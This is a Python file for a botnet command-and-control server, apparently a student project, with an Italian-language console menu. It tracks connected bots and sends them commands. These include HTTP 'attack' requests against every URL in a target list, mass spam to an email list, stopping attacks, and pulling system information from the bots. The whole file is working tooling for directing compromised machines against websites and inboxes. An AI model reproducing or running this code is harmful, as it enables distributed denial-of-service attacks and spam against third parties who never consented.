import concurrent
import socket
from asyncio import Event
from concurrent.futures import ThreadPoolExecutor

import requests

# server_address = ('10.0.2.15', 15200)
server_address = ('localhost', 15200)
clients = []


def initialize(e):
    """
    Initialize the server and listen for incoming connections.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((server_address[0], server_address[1]))
    s.listen(5)
    s.settimeout(2)
    while not e.is_set():
        try:
            client, address = s.accept()
            data = client.recv(1024)

            print("--------------------------------------")
            if address[0] not in clients:
                clients.append(address[0])
                print(f"Bot connected: {data.decode('utf-8')}")
            else:
                clients.remove(address[0])
                print(f"Bot disconnected: {data.decode('utf-8')}")
            print("--------------------------------------")
        except socket.timeout:
            continue


def start_server():
    """
    Start a thread for the server and a thread to handle console input.
    It will wait for both threads to finish before exiting the program.
    """
    event = Event()
    with ThreadPoolExecutor(max_workers=2) as executor:
        x = executor.submit(initialize, event)
        y = executor.submit(handle_console, event)

        # Check if both threads are done
        concurrent.futures.wait([x, y], return_when=concurrent.futures.FIRST_COMPLETED)

        executor.shutdown(wait=False)


def handle_console(e):
    """
    Handle console input from the user.
    """
    while not e.is_set():
        print("1. Mostra tutti i client connessi")
        print("2. Effettua richieste http")
        print("3. Ferma attacco")
        print("4. Mostra informazioni di un client")
        print("5. Avvia mail spam")
        print("6. Controlla lo stato dei bot")
        print("0. Exit")
        scelta = int(input())

        if scelta == 0:
            print("Exiting...")
            e.set()
            return
        elif scelta == 1:
            get_all_clients()
        elif scelta == 2:
            send_http_request()
        elif scelta == 3:
            find_bot(path='stop-attack', method="GET")
        elif scelta == 4:
            find_bot(path='client-info', method="GET")
        elif scelta == 5:
            mail_spam()
        elif scelta == 6:
            bot_status()
        else:
            print("Scelta non valida")


def get_all_clients():
    """
    Print all the clients connected to the server
    """
    if len(clients) == 0:
        print("Nessun bot connesso")
        return

    for key, client in enumerate(clients):
        print(f'Client {key + 1}: {client}')


def send_http_request():
    """
    Start the attack of all the bots or of a specific bot
    """

    with open("urls-db.txt", "r") as f:
        urls = f.read().split("\n")
        urls = [url for url in urls if url != ""]
        if not urls:
            print("Nessun URL da attaccare")
            return

        print("1. Attacca tutti gli URL")
        print("2. Attacca un URL specifico")

        scelta = int(input())

        if scelta == 1:
            for url in urls:
                for client in clients:
                    requests.post(f"http://{client}/attack", json={
                        'url': url
                    })
                    # requests.post(f"http://{client[1][0]}:8080/attack", json={
                    #     'url': url
                    # })

        else:
            print("Seleziona un URL da attaccare: ")
            for key, url in enumerate(urls):
                print(f"{key + 1}. {url}")

            url = urls[int(input()) - 1]

            find_bot(path='attack', method="POST", json={
                'url': url
            })


def print_client_info(client, res):
    print(f"Client Ip: {client}")
    print(f"CPU: {res.json()['cpu']}")
    print(f"CPU usage: {res.json()['cpu_usage']}%")
    print(f"RAM (GB): {res.json()['ram']}")
    print(f"RAM usage: {res.json()['ram_usage']}%")
    print(f"System: {res.json()['system']}")
    print(f"Cores: {res.json()['cores']}")
    print(f"Total Cores: {res.json()['total_cores']}")
    print(f"Users: {res.json()['users']}")
    print("--------------------")


def mail_spam():
    with open("spam-db.txt", "r") as f:
        emails = f.read().split("\n")
        emails = [email for email in emails if email != ""]

        mail_object = "Spam email"
        message = "I'm so sorry for this spam email, but I'm testing my botnet. Please don't report me, I'm just a " \
                  "student. Thank you for your understanding."

        number_of_mails = int(input("Quante email vuoi inviare? "))

        data = {
            "emails": emails,
            "message": message,
            "mail_object": mail_object,
            "number_of_emails": number_of_mails
        }
        find_bot(path='mail-spam', method="POST", json=data)


def find_bot(path, method, json=None):
    if len(clients) == 0:
        print("Nessun bot connesso")
        return

    if input("Voi utilizzare tutti i bot connessi? S/N: ") in ["S", "s"]:
        if method == "GET":
            for client in clients:
                res = requests.get(f"http://{client}/{path}")
                # res = requests.get(f"http://{client[1][0]}:8080/{path}")
                if path == "client-info":
                    print_client_info(client, res)
        elif method == "POST":
            for client in clients:
                requests.post(f"http://{client}/{path}", json=json)
                # requests.post(f"http://{client[1][0]}:8080/{path}", json=json)
    else:
        client_ip = input("Inserisci l'Ip del bot di cui vuoi sapere le info: ")
        if client_ip not in clients:
            print("Bot non trovato")
            return
        else:
            if method == "GET":
                res = requests.get(f"http://{client_ip}/{path}")
                # res = requests.get(f"http://{client_ip}:8080/{path}")
                if path == "/client-info":
                    print_client_info(client_ip, res)
            elif method == "POST":
                requests.post(f"http://{client_ip}/{path}", json=json)
                # requests.post(f"http://{client_ip}:8080/{path}", json=json)


def bot_status():
    """
    Check if a bot is still connected to the server.
    """
    for client in clients:
        try:
            res = requests.get(f"http://{client}/status")
            # requests.get(f"http://{client}:8080/ststus")

            print(f"Bot: {client}")
            print(f"Operation: {res.json()['operation']}")
            if targets := res.json()['targets']:
                for targets in targets:
                    print(f"Target: {targets}")
            print("--------------------------------")
        except requests.exceptions.ConnectionError:
            print(f"Bot {client} disconnesso")
            clients.remove(client)


def check_bot_is_active():
    for client in clients:
        try:
            requests.get(f"http://{client}/status")
            # requests.get(f"http://{ip}:8080/status")
            print(f"Bot: {client} attivo")
        except requests.exceptions.ConnectionError:
            print(f"Bot {client} disconnesso")
            clients.remove(client)


if __name__ == '__main__':
    start_server()
